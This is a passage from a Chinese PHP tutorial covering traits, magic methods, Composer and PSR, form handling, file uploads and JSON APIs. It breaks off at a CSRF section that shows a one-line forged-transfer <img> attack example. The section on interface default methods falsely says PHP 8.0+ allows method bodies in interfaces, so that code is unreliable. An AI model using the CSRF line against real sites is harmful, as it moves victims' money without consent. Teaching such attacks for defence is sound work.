$a = new Article("Hello PHP");
$a->log("创建文章");
echo $a->slug();                             // hello-php
```

Trait 就是"编译期复制粘贴"：方法体直接并入 use 它的类。典型用途：日志、缓存键、时间戳（`createdAt/updatedAt`）——Laravel 框架大量用 trait（`Notifiable`、`SoftDeletes`）横向给模型挂能力。选型口诀：**共享数据结构用继承，共享能力片段用 trait，只定义合同用接口**。

### static、self、parent 三兄弟与后期静态绑定

```php
class Base
{
    public static string $tag = "Base";

    public static function who(): string { return static::$tag; }   // static:: = 后期静态绑定

    public function show(): void
    {
        echo self::$tag, " / ", static::$tag, "\n";
    }
}

class Child extends Base
{
    public static string $tag = "Child";
}

(new Base)->show();     // Base / Base
(new Child)->show();    // Base / Child —— self 指“定义这行的类”，static 指“实际调用的类”
```

`self::` 是**编译期绑定**（钉死在写它的那个类），`static::` 是**运行期绑定**（谁被调用找谁）——后期静态绑定（LSB）让父类的静态方法在子类语境下用子类的成员。初学守住三条：静态方法里不能 `$this`；`::` 访问静态属性与常量；工厂方法用 `new static()` 返回"实际调用的类"的实例（Laravel 模型 `User::where()` 链的机制基础）。

### 对象比较：== 与 === 的对象版

第 2 章 `===` 守则在对象上的具体表现：

```php
$a = new Student("张三", 90);
$b = new Student("张三", 90);
$c = $a;                        // 引用（同一对象）

$a == $b;      // true  ：属性值全部相等
$a === $b;     // false ：不是同一个实例
$a === $c;     // true  ：同一对象
```

守则升级：**对象比较"内容相等"用 `==` 可用但更推荐自定义 equals 语义或比较关键字段**（`$a->id === $b->id`）；判断"是不是同一份实例"用 `===` 或 `spl_object_id($a) === spl_object_id($b)`。数据库行对应的模型对象永远用 id 比较（同 Java 教程 equals/hashCode 的教训）。

## 5.6 魔术方法：__ 开头的钩子

双下划线方法（同 Python 的 dunder）是对象的"系统钩子"，最常用五个：

```php
class Product
{
    public function __construct(
        private array $attrs = [],
    ) {}

    public function __toString(): string          // echo $obj / 字符串上下文时触发
    {
        return "Product(" . json_encode($this->attrs, JSON_UNESCAPED_UNICODE) . ")";
    }

    public function __get(string $name): mixed    // 读不存在的属性时触发
    {
        return $this->attrs[$name] ?? null;
    }

    public function __set(string $name, mixed $value): void   // 写不存在的属性
    {
        $this->attrs[$name] = $value;
    }

    public function __call(string $name, array $args): mixed  // 调不存在的方法
    {
        throw new BadMethodCallException("没有方法：$name");
    }

    public function __invoke(mixed ...$args): float           // $obj() 当函数调用
    {
        return array_sum($args);
    }
}

$p = new Product(["price" => 99]);
echo $p;                        // __toString：Product({"price":99})
echo $p->color;                 // __get：null
echo $p(1, 2, 3);               // __invoke：6
```

必会清单：`__construct`（构造）、`__toString`（打印可读）、`__get/__set`（属性拦截）、`__invoke`（可调用对象）、`__clone`（克隆钩子）。序列化场景的 `__sleep/__wakeup`、数据库 ORM 的 `__call` 动态查询，见到能认即可。

### 接口默认方法、常量与匿名类

接口的现代形态（PHP 8.0+）补全三件事：

```php
interface Priceable
{
    public const MAX_DISCOUNT = 0.5;            // 接口常量（全大写）

    public function price(): float;

    public function finalPrice(): float         // 默认实现（8.0+，类可免写）
    {
        return $this->price();
    }
}

class Freebie implements Priceable
{
    public function price(): float { return 0.0; }
    // finalPrice 白捡默认实现
}

// 匿名类：一次性实现（测试桩、临时适配器）
$logger = new class {
    public array $lines = [];
    public function info(string $m): void { $this->lines[] = $m; }
};
$logger->info("hello");
var_dump($logger->lines);
```

`instanceof` 的三个用法也归入本章收尾：类型守卫（`if ($x instanceof Priceable)`）、类型联合判断（`match(true)` 分支里）、测试断言（`$this->assertInstanceOf(...)`）。

### 一份"类的设计自检单"

写完类过一遍（对照 Java 教程 5.9 的设计问答）：

- [ ] 属性都该有类型声明吗？（是——现代 PHP 没有无类型属性的位置）
- [ ] 有没有 5 个以上构造参数？（是 → 提升参数打包成值对象类）
- [ ] 方法超过 30 行？（是 → 拆私有方法或提取类）
- [ ] 有 `get/set` 前缀但仍只是直接读写？（考虑 readonly 属性替代）
- [ ] 这个类"只是装数据"？（是 → 构造器提升 + readonly，别手写 getter）
- [ ] 需要横向复用一组方法？（trait）只约定合同？（interface）共享实现与状态？（继承/组合——组合优先）

自检单的答案没有对错，只有**让半年后的自己少骂人**的程度之分。

### 对象克隆、序列化与"深浅拷贝"

对象赋值是**引用语义**（`$b = $a` 后两者是同一实例，对照 Java/Python 教程"遥控器"）——真复制用 `clone`：

```php
class Cart
{
    public function __construct(public array $items = []) {}
}

$a = new Cart(["苹果"]);
$b = $a;                       // 引用
$c = clone $a;                 // 浅拷贝：新对象外壳，但内部数组元素若也是对象仍共享
$b->items[] = "香蕉";
var_dump(count($a->items));    // 2 —— b 改的是同一个对象
$c->items[] = "梨";
var_dump(count($a->items));    // 2 —— clone 的外壳独立，c 的改动不影响 a（此处数组是值拷贝）

// 深拷贝：属性里还有对象时，实现 __clone 手动复制内层
class Order
{
    public function __construct(public Cart $cart) {}
    public function __clone()
    {
        $this->cart = clone $this->cart;   // 内层也克隆
    }
}
```

**序列化**（对象 ↔ 字符串）：`serialize/unserialize` 是 PHP 历史机制，`json_encode/json_decode` 是现代通用格式——**unserialize 用户输入是著名 RCE 漏洞源（POP 链攻击），永远不要反序列化不受信数据**（第 10 章清单的补充条款）。现代项目对象传输一律 JSON。

对照系列：Java 的 clone/浅深拷贝（教程 9.6）、Python 的 copy/deepcopy（教程 5.6）——**三卷同一课：引用赋值 + 浅拷贝是共享内存的坑，深拷贝要显式动手**。

### 接口隔离与组合：一个实战重构

第 7.6 节"组合优于继承"的 PHP 实战版——先写一个"胖接口"反例：

```php
// 反例：万能 Worker 接口——所有实现类被迫实现用不到的方法
interface Worker
{
    public function writeCode(): array;
    public function writeDocs(): string;
    public function test(): bool;
}

class Programmer implements Worker { /* 三个都会 */ }
class TechWriter implements Worker
{
    public function writeCode(): array { throw new LogicException("文档工程师不写代码"); }  // ← 坏味道
    ...
}
```

文档工程师被逼着"实现"写代码——接口太胖，实现类被迫撒谎。**接口隔离原则（ISP）**：拆成小接口，按能力组合：

```php
interface Coder     { public function writeCode(): array; }
interface Docer     { public function writeDocs(): string; }
interface Tester    { public function test(): bool; }

class Programmer implements Coder, Docer, Tester { ... }   // 三证齐全
class TechWriter implements Docer                     { ... }   // 只签能干的合同

// 函数按"最小能力"要参数——Docer 函数绝不误收 Programmer-only 对象
function publish(Docer $w): void { echo $w->writeDocs(); }
```

三招对比记忆（对照 Java 教程 7.1 的抽象类 vs 接口表）：**继承**（is-a、要动父类状态）、**接口**（can-do、只约定形状——拆得越小越灵活）、**trait**（复用方法体、横向塞）。Laravel 的中间件、事件广播全是"小接口 + 容器解析"的组合拳——第 12 章回看时，你对这套设计的理解已经先于框架。

## 5.7 小结

- 类 = 可见性 + 类型声明的属性/方法；`->` 成员、`::` 静态、`$this/parent/self`；
- **构造器属性提升**是现代 PHP 类的标准形态；readonly 锁不可变；
- extends 单继承（父类构造器要显式调）、abstract 抽象、interface 多合同；
- Trait 横向复用能力片段；魔术方法是语言钩子（toString/get/set/invoke）；
- OOP 思想与 Java 教程同源：封装守门、多态分发、面向接口。

## 练习 5

1.（概念）构造器属性提升省掉了哪些仪式代码？readonly 修饰的属性还能在方法里改吗？
2.（编程）`User` 类：构造器提升 `public readonly string $name`、`private int $age`；`isAdult(): bool`（>=18）；`__toString` 输出 "name(age)"。
3.（编程）抽象类 `Animal`（构造器提升 name，抽象方法 speak(): string）+ `Dog`/`Cat` 实现；循环多态输出。
4.（编程）接口 `Discountable { function finalPrice(): float; }`；`Product` 类（name/price）实现它（满 100 打 8 折）；函数 `checkout(Discountable $item): float` 打印折后价。
5.（编程）trait `Timestampable { public ?string $createdAt = null; public function touch(): void { $this->createdAt = date("H:i:s"); } }`，用在 `Post` 类上。

## 参考答案

**1.** 省掉：属性声明行 + 构造器里的 `$this->x = $x` 赋值行（声明、类型、赋值三合一）。readonly 属性只能在**声明处或构造器**初始化，之后任何赋值（包括方法内）都报 Error——它是真正的"不可变"。

**2.**

```php
class User
{
    public function __construct(
        public readonly string $name,
        private int $age,
    ) {}

    public function isAdult(): bool
    {
        return $this->age >= 18;
    }

    public function __toString(): string
    {
        return "{$this->name}({$this->age})";
    }
}
```

**3.**

```php
abstract class Animal
{
    public function __construct(protected string $name) {}
    abstract public function speak(): string;
}

class Dog extends Animal
{
    public function speak(): string { return "{$this->name}: 汪汪"; }
}

class Cat extends Animal
{
    public function speak(): string { return "{$this->name}: 喵"; }
}

foreach ([new Dog("旺财"), new Cat("咪咪")] as $a) {
    echo $a->speak(), "\n";
}
```

**4.**

```php
interface Discountable { public function finalPrice(): float; }

class Product implements Discountable
{
    public function __construct(public string $name, public float $price) {}
    public function finalPrice(): float
    {
        return $this->price >= 100 ? $this->price * 0.8 : $this->price;
    }
}

function checkout(Discountable $item): void
{
    printf("%s 折后 %.2f 元\n", $item->name, $item->finalPrice());
}

checkout(new Product("键盘", 299));      // 键盘 折后 239.20 元
```

**5.**

```php
trait Timestampable
{
    public ?string $createdAt = null;
    public function touch(): void { $this->createdAt = date("H:i:s"); }
}

class Post
{
    use Timestampable;
    public function __construct(public string $title) {}
}

$p = new Post("Hello");
$p->touch();
var_dump($p->createdAt);          // 如 "10:30:00"
```

**[▲ 返回目录](#toc)**

---

<a id="h06"></a>

# 第 6 章 命名空间、Composer 与 PSR

> 本章目标：命名空间解决"类重名"；Composer 管依赖与自动加载；PSR-4 目录规范。学完本章，你的代码从"脚本堆"升级为"现代 PHP 项目"。

---

## 6.1 命名空间：类的文件夹

全局 class 名冲突是所有语言的老问题（你写 `User`，第三方库也写 `User`）。**命名空间（namespace）** 给类挂全限定名：

```php
<?php
// src/Model/User.php
namespace App\Model;              // 声明命名空间（必须是文件第一条 PHP 语句）

class User
{
    public function __construct(public string $name) {}
}
```

```php
<?php
// src/Controller/User.php
namespace App\Controller;         // 不同命名空间可以有同名类！

use App\Model\User;               // use：导入要用的类（写在 namespace 之后）

$u = new User("张三");             // 此处 User 指 App\Model\User
var_dump($u instanceof \App\Model\User);
```

规则速记：

- 命名空间**约定与目录结构一致**（`App\Model\User` → `src/Model/User.php`）——这个约定由 PSR-4 规范与 Composer 自动加载落地（6.2 节）；
- `use App\Model\User as U;` 起别名；`\App\Model\User` 全限定名写法；
- **use 不是 include**——它只是给类起个短名，真正的文件加载交给自动加载器；
- 函数/常量也有命名空间，但实际项目几乎只给类用。

## 6.2 自动加载：告别 require 长队

没有自动加载的远古 PHP 是这样的：

```php
require_once "src/Model/User.php";
require_once "src/Model/Order.php";
require_once "src/Service/PayService.php";    // 几十个 require 排成瀑布
```

**自动加载器（autoloader）** 的思路：当代码用到未加载的类时，按"类名 → 文件路径"的约定**现场去找文件加载**。**Composer**（PHP 的依赖管理器，对标 Maven/Composer=Composer）生成的正是这套加载器。

## 6.3 Composer：依赖管家 + 自动加载

安装：<https://getcomposer.org/download/> 下载 `Composer-Setup.exe`（Windows 安装器自动配 PATH）；验证 `composer -V`。phpStudy 用户注意：命令行 composer 要选对 PHP 版本（用 phpStudy 对应版本的 php.exe 路径，或把它加进 PATH）。

### 初始化与安装依赖

```
cd 项目目录
composer init                        # 交互式生成 composer.json（或手写）
composer require monolog/monolog     # 安装日志库（自动写进 composer.json + 生成 autoload）
```

`composer.json` 长这样：

```json
{
    "name": "me/demo",
    "require": {
        "php": ">=8.1",
        "monolog/monolog": "^3.0"
    },
    "autoload": {
        "psr-4": {
            "App\\": "src/"
        }
    }
}
```

`^3.0` 语义化版本：允许 3.x 任何版本、不允许 4.0（破坏性升级）。装完项目里多了 `vendor/` 目录（所有依赖 + autoload.php）。**vendor 不进 Git**，同伴克隆后 `composer install` 一键复原（读 composer.lock 锁定的精确版本）。

### PSR-4 自动加载的绑定

上面 `"App\\": "src/"` 的含义：**命名空间前缀 `App\` 映射到 `src/` 目录**——`App\Model\User` 类按约定去 `src/Model/User.php` 找。此后你的入口文件只需一行：

```php
<?php
// public/index.php
require __DIR__ . "/../vendor/autoload.php";     // 一行接管一切类加载

use App\Model\User;
use App\Service\PayService;

$u = new User("张三");                            // 用到才加载，无需 require
```

常用命令：

```
composer require 包名            # 安装并写入 json
composer remove 包名             # 卸载
composer update                  # 按约束升级（谨慎：会改 lock）
composer install                 # 按 lock 精确复原（部署/协作用这个）
composer dump-autoload           # 改了 autoload 配置后刷新映射
composer show                    # 已装清单
```

国内镜像加速：`composer config -g repos.packagist composer https://mirrors.aliyun.com/composer/`。

### 常用包速记

| 包                | 用途                                |
| ----------------- | ----------------------------------- |
| monolog/monolog   | 日志（对标 Java SLF4J/Logback）     |
| guzzlehttp/guzzle | HTTP 客户端（对标 Python requests） |
| phpunit/phpunit   | 单元测试（对标 JUnit/pytest）       |
| vlucas/phpdotenv  | 读 .env 配置                        |
| fakerphp/faker    | 造测试假数据                        |

### composer.json 深入：scripts 与 require-dev

两个实用配置段，读懂"别人家的 composer.json"：

```json
{
    "require": {
        "php": ">=8.1",
        "monolog/monolog": "^3.0"
    },
    "require-dev": {                       // 只在开发环境装（生产 --no-dev 跳过）
        "phpunit/phpunit": "^10.0",
        "squizlabs/php_codesniffer": "^3.9"
    },
    "autoload": {
        "psr-4": { "App\\": "src/" },
        "files": ["src/helpers.php"]       // 这些文件每次都加载（全局函数放这里）
    },
    "scripts": {
        "test": "phpunit",                 // composer test 一条命令跑测试
        "lint": "phpcs --standard=PSR12 src/"
    }
}
```

三件事：**require vs require-dev**（测试/风格工具不上生产）；**autoload.files**（PSR-4 管类、files 管散装函数——`e()` 这类全局帮手函数注册的地方）；**scripts**（把常用命令命名化，`composer test` 即可执行——项目文档的"跑法"自动内置）。安装期的钩子 `post-install-cmd` 还能挂自定义脚本（Laravel 的密钥生成就在这里）。

### 命名空间与"完全限定名"的细节

use 语句的五种形态与解析规则：

```php
namespace App\Controller;

use App\Model\User;                    // 完整导入
use App\Model\User as ArticleAuthor;   // 别名（两个 User 共存时救命）
use App\Model\{User, Order};           // 组合导入（同命名空间多个类）
use function App\Helpers\formatMoney;  // 导入函数（少见但合法）
use const App\MAX;                     // 导入常量（更少见）

new User();                            // 解析为 App\Model\User（use 的效果）
new \App\Model\User();                 // 全限定名：反斜杠开头 = 从根开始，无视 use
new Model\User();                      // 相对名：App\Controller\Model\User（当前命名空间拼接）——十有八九是 bug！
```

最后两行的对比是命名空间问题的万恶之源：**非反斜杠开头 = 相对当前命名空间解析**。看到 `Class "...\Model\User" not found` 报错，第一件事检查是不是少写了 use 或开头反斜杠。另外 Composer 的 `composer dump-autoload` 在新增类找不到时执行一次（刷新映射缓存）。

## 6.4 PSR：PHP 的工程规范体系

**PSR**（PHP Standard Recommendations）是 PHP-FIG 组织制定的互操作标准，现代项目的通用语：

- **PSR-4**：自动加载规范（上面已用）；
- **PSR-12**：代码风格——类大驼峰、方法小驼峰、左花括号类/方法同行、每行不超 120 字符、缩进 4 空格（对标 Python PEP 8）；
- **PSR-3**：日志接口（LoggerInterface——monolog 实现它）；
- **PSR-7/15**：HTTP 消息/中间件（框架互操作）。

工具化执行（对标 Python ruff）：`composer require --dev squizlabs/php_codesniffer` 后 `vendor/bin/phpcs --standard=PSR12 src/` 检查、`phpcbf` 自动修复。

### 全局工具、vendor/bin 与 .env

三件"装完 Composer 之后要知道的事"：

**① 全局安装工具**（`composer global require`）——装到用户目录、全机器可用：

```
composer global require laravel/installer     # Laravel 项目生成器
laravel new myblog                            # 全局命令直接用
```

**② 依赖自带的命令行工具**——包把可执行脚本放进 `vendor/bin/`，本地调用：

```
vendor/bin/phpunit tests/          # 测试框架的可执行入口
composer exec phpunit tests/       # 等价写法（自动找 vendor/bin）
```

**③ .env 配置分离**（vlucas/phpdotenv）——数据库密码等敏感配置不进代码、不进 Git：

```ini
# .env（gitignore 必须包含它！）
DB_HOST=127.0.0.1
DB_NAME=demo
DB_USER=root
DB_PASS=secret
```

```php
$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->load();
$pdo = new PDO("mysql:host={$_ENV["DB_HOST"]};dbname={$_ENV["DB_NAME"]}", $_ENV["DB_USER"], $_ENV["DB_PASS"]);
```

配置与代码分离 = **同一份代码多套环境**（开发/测试/生产各一个 .env）+ 密钥不泄密（Git 历史里没有密码）。第 11、12 章项目沿用此约定。

### Xdebug 与 PHPStan：两大质量工具

**Xdebug**：断点调试器（对标 Java 的 IDEA 调试器、超越 printf 大法）。phpStudy 面板一键启用；VS Code 装 "PHP Debug" 扩展、launch.json 配好端口（9003）后——打断点、F5 启动、浏览器访问，停在断点看全部变量。调试体验从"到处插 var_dump"升级为"单步观察"。

**PHPStan**：静态分析器（对标 Java 编译器检查 + Python mypy）——**不运行代码找类型错**：

```
composer require --dev phpstan/phpstan
vendor/bin/phpstan analyse src --level=6
# Line   src/Model/User.php
#  12    Method App\Model\User::getName() should return string but returns int.
```

等级 0~9（越严格越挑刺），现代项目起步 level 6+，逐步收紧。CI 三件套最终形态：**phpstan（类型）+ phpcs/PHP-CS-Fixer（风格）+ PHPUnit（行为）**——三条全绿才合入，与 Java/Python 卷的 CI 思想一字不差。

## 6.5 项目结构：现代 PHP 应用的模样

```
demo-app/
├── composer.json / composer.lock
├── vendor/                  ← 依赖（不进 Git）
├── public/                  ← 唯一对外暴露的目录（Web 服务器指到这里）
│   └── index.php            ← 前端控制器：一行 autoload + 路由分发
├── src/                     ← 你的代码（App\ 命名空间）
│   ├── Model/
│   ├── Service/
│   └── Controller/
├── config/
└── tests/
```

**为什么入口只有 public 可访问**：数据库密码等敏感文件全在 public 之外，Web 服务器物理上够不到它们——这是"最小暴露面"安全原则（对照 C 教程的"最小权限"）。第 11 章留言板项目会先给出单文件的简化版，再按此结构重构成这个形态。

### 发布自己的包：从本地到 Packagist

把一个趁手的帮手库发布出去（也是"读懂所有开源包"的终极验证）。三步：

**① 写包**（独立目录，composer.json 里 name 必须唯一）：

```json
{
    "name": "yourname/str-plus",
    "description": "常用字符串增强函数",
    "type": "library",
    "license": "MIT",
    "require": { "php": ">=8.1" },
    "autoload": { "files": ["src/helpers.php"] }
}
```

**② 推 GitHub + 提交 Packagist**：<https://packagist.org> 提交你的 GitHub 仓库地址；配置 Webhook 自动同步版本。打版本标签：

```
git tag 1.0.0 && git push origin 1.0.0
```

**③ 别人安装**：`composer require yourname/str-plus`——**你从此也是生态的一部分**。

发布前的质量门槛（自我要求即行业要求）：README 带安装/用法示例、PHPUnit 测试 + CI 绿标、LICENSE 文件（MIT 最常用）、语义化版本（破坏性改动升大版本）。哪怕不发包，**"假装要发布"的自律会让代码质量上一个台阶**——这个心法对照 Java 教程"接口合同"、Python 教程 PEP 8 工具化，殊途同归。

### Composer 的坑位速查

```
 composer install 报"缺少 ext-xxx"    → php.ini 没启用对应扩展（改完重启）
 composer update 后全站炸             → update 升了依赖大版本；回滚用 git checkout composer.lock 后 install
 两个人装出不同版本                   → 有人 update 有人 install；铁律：协作只跑 install，lock 进 Git
 "Package not found"                 → 私有包/新包：composer clearcache 或等 Packagist 同步
 类找不到 Class not found             → 新类没被加载：composer dump-autoload
```

（对照 Java 教程 Maven、Python 教程 pip 的坑表——包管理器的坑全世界一样，都是"版本与锁"两件事。）

## 6.6 小结

- namespace 给类全限定名，use 起短名；命名空间与目录结构约定一致；
- Composer = 依赖管理 + PSR-4 自动加载；vendor 不进 Git、install 按 lock 复原；
- `require vendor/autoload.php` 一行接管类加载；
- PSR-12 风格用工具强制（phpcs）；public 唯一暴露是安全基线。

## 练习 6

1.（概念）use 与 require 的区别？自动加载器在什么时刻工作？
2.（操作）创建项目：composer init → `composer require monolog/monolog` → 查看 vendor 与 composer.lock → 写代码用 Monolog 输出一条日志。
3.（概念）PSR-4 映射 `"App\\": "src/"` 下，类 `App\Service\Pay\WechatPay` 应该在哪个文件？
4.（编程）src/Model/ 下建 Order 类（命名空间 App\Model），public/index.php 通过 autoload 实例化它，全程无 require_once。
5.（概念）为什么 Web 服务器把根目录指向 public/ 而不是项目根目录？

## 参考答案

**1.** use 只是给类起短名（不加载任何文件）；require 是立即加载。自动加载器在**首次用到未定义的类时**触发（类的"懒加载"），按 PSR-4 映射找文件。

**2.** 关键代码：

```php
require __DIR__ . "/vendor/autoload.php";
use Monolog\Logger;
use Monolog\Handler\StreamHandler;

$log = new Logger("demo");
$log->pushHandler(new StreamHandler("php://stdout", Logger::INFO));
$log->info("项目跑起来了");
```

**3.** `src/Service/Pay/WechatPay.php`——命名空间的 `\` 逐段对应目录层级。

**5.** 项目根还有 composer.json、配置文件、（若乱放）密码文件——指向 public/ 后 Web 服务器只能发 public 下的东西，配置与源码不会被 URL 直接下载（最小暴露面原则）。

**[▲ 返回目录](#toc)**

---

<a id="h07"></a>

# 第 7 章 表单与请求

> 本章目标：读懂 HTTP 请求如何抵达 PHP；$_GET/$_POST 超全局的正确读法；表单验证与 CSRF 预备；完成"能提交的留言表单"。这是动态网站的"进"通道。

---

## 7.1 请求怎么抵达 PHP

一次表单提交的完整旅程（第 1 章运行模式的展开）：

```
浏览器：<form action="/submit.php" method="post"> 用户填完点提交
    ▼  HTTP 请求（POST /submit.php，请求体里是表单数据）
Web 服务器 → 调用 submit.php → PHP 把请求体解析进 $_POST
    ▼
submit.php 从头执行：读 $_POST、校验、存库、echo 响应
    ▼
浏览器收到响应 HTML，跳转/显示结果
```

**GET 与 POST 的分工**（对照 Java 教程 13.5）：GET 参数挂在 URL（`?page=2`）——可收藏、可缓存，用于"查询"；POST 数据在请求体——用于"提交修改"（登录、留言）。**会产生变化的操作永远用 POST**。

## 7.2 读取请求数据：$_GET 与 $_POST

```php
<?php
// form.php —— 提交页面
?>
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>留言</title></head><body>
<form action="submit.php" method="post">
    <p>昵称：<input name="nickname" required></p>
    <p>内容：<textarea name="content" rows="3"></textarea></p>
    <p><button type="submit">提交</button></p>
</form>
</body></html>
```

```php
<?php
// submit.php —— 接收页面
$name = trim($_POST["nickname"] ?? "");      // 标准读法：?? 兜底 + trim
$content = trim($_POST["content"] ?? "");

if ($name === "" || $content === "") {
    http_response_code(400);                 // 告诉浏览器/前端这是客户端错误
    exit("昵称和内容不能为空");
}

echo "收到！<br>";
echo htmlspecialchars($name, ENT_QUOTES, "UTF-8") . " 说：<br>";
echo htmlspecialchars($content, ENT_QUOTES, "UTF-8");
```

三条铁律（每一处都有第 10 章的安全回收）：

1. **超全局的值一律当"敌人"对待**：永远先 `?? 默认值`、`(string)` 强转、`trim()`——不存在的键在 PHP 8 是 Warning（不开 notice 显示时静默 null）；
2. **输入要验证**（它符合预期形状吗）；**输出要转义**（htmlspecialchars 防 XSS）——两个方向两道工序；
3. 验证失败用 `http_response_code(400)` 告知而非只打印文字——HTTP 状态码是给程序看的合同。

### $_GET 的用法与"查询"语义

```php
// list.php?page=2&keyword=php
$page   = max(1, (int)($_GET["page"] ?? 1));     // int 强转 + 下界保护
$keyword = trim($_GET["keyword"] ?? "");
echo "第 $page 页，关键词：" . htmlspecialchars($keyword);
```

GET 参数直接可见于 URL，**永远不要**用它传密码、token 等（浏览器历史、服务器日志、Referer 头全是泄露点）。

### $_SERVER 与请求元信息

```php
$_SERVER["REQUEST_METHOD"]     // GET / POST
$_SERVER["REQUEST_URI"]        // /submit.php?page=1
$_SERVER["HTTP_USER_AGENT"]    // 浏览器标识
$_SERVER["REMOTE_ADDR"]        // 客户端 IP
$_SERVER["HTTP_REFERER"]       // 来源页（可伪造，别信）
```

## 7.3 验证：服务端是最后防线

**客户端的 required/maxlength 只是体验优化，服务端验证才是真防线**（用户可以用 curl 绕过一切前端限制）。一套实用的验证写法：

```php
<?php
function validatePost(array $post): array          // 返回 [数据, 错误列表]
{
    $errors = [];

    $name = trim($post["nickname"] ?? "");
    $content = trim($post["content"] ?? "");

    if ($name === "") {
        $errors[] = "昵称不能为空";
    } elseif (mb_strlen($name) > 20) {
        $errors[] = "昵称不能超过 20 字";
    } elseif (!preg_match('/^[\w\x{4e00}-\x{9fff}]+$/u', $name)) {
        $errors[] = "昵称只能含中文、字母、数字、下划线";
    }

    if (mb_strlen($content) < 5) {
        $errors[] = "留言至少 5 个字";
    } elseif (mb_strlen($content) > 500) {
        $errors[] = "留言不能超过 500 字";
    }

    return [[$name, $content], $errors];
}

[$data, $errors] = validatePost($_POST);

if ($errors) {
    http_response_code(422);                       // Unprocessable Content：校验失败
    foreach ($errors as $e) {
        echo htmlspecialchars($e), "<br>";
    }
    exit;
}
// ……通过验证，继续业务（存库，第 9 章）
```

验证清单套路：**必填 → 长度 → 形状（正则）→ 业务规则**；失败收集全部错误一次返回（用户体验）；对照 FastAPI 的 Pydantic——框架把这套手工活自动化了，原理就是它。

### 文件上传：$_FILES 与安全三查

表单加 `enctype="multipart/form-data"` 属性（文件上传专用编码，少了它 PHP 收不到文件）即可上传，PHP 把文件装进 `$_FILES`：

```php
<?php
// upload.php —— 带安全三查的上传
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_FILES["avatar"])) {
    $f = $_FILES["avatar"];

    // 查 1：上传过程本身出错吗？（0 = OK）
    if ($f["error"] !== UPLOAD_ERR_OK) {
        exit("上传失败，错误码 {$f["error"]}");
    }
    // 查 2：类型白名单（别信扩展名！用文件内容判断）
    $allowed = ["image/jpeg" => "jpg", "image/png" => "png"];
    $mime = mime_content_type($f["tmp_name"]);          // 按文件内容判断真实类型
    if (!isset($allowed[$mime])) {
        exit("只允许 jpg/png");
    }
    // 查 3：大小限制
    if ($f["size"] > 2 * 1024 * 1024) {
        exit("最大 2MB");
    }

    // 存储三原则：改名（防覆盖/防路径注入）、移出可执行目录、不保留原名
    $newName = bin2hex(random_bytes(16)) . "." . $allowed[$mime];
    move_uploaded_file($f["tmp_name"], __DIR__ . "/uploads/" . $newName);
    echo "上传成功：uploads/" . htmlspecialchars($newName);
}
?>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="avatar">
    <button>上传</button>
</form>
```

`$_FILES["name"]` 的五字段：`name`（原文件名——**只用于展示，不可信**）、`type`（客户端声称的类型——**不可信**，所以用 mime_content_type 验内容）、`tmp_name`（服务端临时文件）、`error`、`size`。**安全三查 + 改名 + 存储目录禁执行**（第 10 章"上传 webshell"的完整防御），少查一步就是一次上线事故。

### 返回 JSON：API 化的入口

Web 前端（fetch/axios）期待 JSON 而不是 HTML。PHP 版的"return dict"：

```php
<?php
function json_response(mixed $data, int $status = 200): never
{
    http_response_code($status);
    header("Content-Type: application/json; charset=utf-8");
    echo json_encode($data, JSON_UNESCAPED_UNICODE);
    exit;
}

$name = trim($_POST["name"] ?? "");
if ($name === "") {
    json_response(["error" => "name 必填"], 422);
}
json_response(["ok" => true, "greeting" => "你好，{$name}"]);
```

对照 FastAPI 的 `return dict`（自动转 JSON）：PHP 手动三步（状态码 + Content-Type 头 + json_encode），Laravel 则封装成 `response()->json()`。**同一套 HTTP 语义，不同语言的封装厚度**——第 12 章的 API 路由就是这套函数的框架版。

## 7.4 POST/Redirect/GET 模式：防重复提交

提交成功后如果直接 echo 结果页，用户刷新就会**再提交一次**（浏览器重发 POST）。标准解法——**PRG 模式**：POST 处理完**重定向**到 GET 页面：

```php
<?php
// submit.php 成功路径
// ...存库成功...
header("Location: /success.php?msg=ok");     // 302 重定向（Location 头）
exit;                                        // header 后必须 exit！

// success.php —— GET 显示结果
echo "留言成功！";
```

刷新 success.php 只会重放 GET，数据不会重复入库。**任何写操作成功后一律 PRG**——这是 Web 开发的反射级习惯。附带认识 `header()`：PHP 发送 HTTP 响应头的函数，**必须在任何 echo 之前调用**（头先于体，输出了再改头会报 "headers already sent"）。

### fetch 前端对接：让 JS 调你的接口

现代前端（Vue/React 或原生 fetch）消费 JSON 接口。PHP 侧产出 JSON（7.4 节 json_response），前端侧两段对接演示——先理解"接口是被程序调的"：

```php
<?php
// api/messages.php —— JSON 版留言接口（与 HTML 版共享同一套验证/存储逻辑）
require "app.php";

if ($_SERVER["REQUEST_METHOD"] === "GET") {
    $rows = $GLOBALS["pdo"]->query(
        "SELECT m.id, u.username AS author, m.content, m.created_at
         FROM messages m JOIN users u ON u.id = m.user_id
         ORDER BY m.id DESC LIMIT 50"
    )->fetchAll();
    json_response(["data" => $rows]);
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $raw = file_get_contents("php://input");        // fetch 的 JSON 请求体不在 $_POST！
    $body = json_decode($raw, true) ?? [];
    $content = trim($body["content"] ?? "");
    if ($content === "" || mb_strlen($content) > 500) {
        json_response(["error" => "内容需 1~500 字"], 422);
    }
    // ……登录校验、入库（略，同 HTML 版）……
    json_response(["ok" => true, "id" => (int)$GLOBALS["pdo"]->lastInsertId()], 201);
}
json_response(["error" => "不支持的请求方法"], 405);
```

```html
<!-- 前端消费 -->
<script>
async function load() {
    const r = await fetch("api/messages.php");
    const { data } = await r.json();
    document.getElementById("list").innerHTML = data
        .map(m => `<li>${m.author}: ${m.content}</li>`).join("");
}
async function post(content) {
    const r = await fetch("api/messages.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content }),
    });
    if (!r.ok) alert((await r.json()).error);
    load();                                        // 重拉列表
}
load();
</script>
```

三个关键认知：① **JSON 请求体不在 `$_POST`**——要用 `file_get_contents("php://input")` 读原始体再 json_decode；② 前端的 innerHTML 拼接同样要防 XSS（数据含用户内容时前端也要转义，后端已转义则双保险）；③ 接口与页面共用同一套业务代码（验证/存储抽成函数或类）——**HTML 版与 JSON 版只是"皮"，芯是同一颗**。这就是"前后端分离"的最小雏形，也是第 12 章 Laravel API 路由的前奏。

## 7.5 CSRF 预备：为什么表单要带令牌

想象恶意网站 A 的页面里有：

```html
<img src="http://你的站/transfer.php?to=hacker&amount=10000">
<!-- 或一段自动提交到你站的表单 -->
```

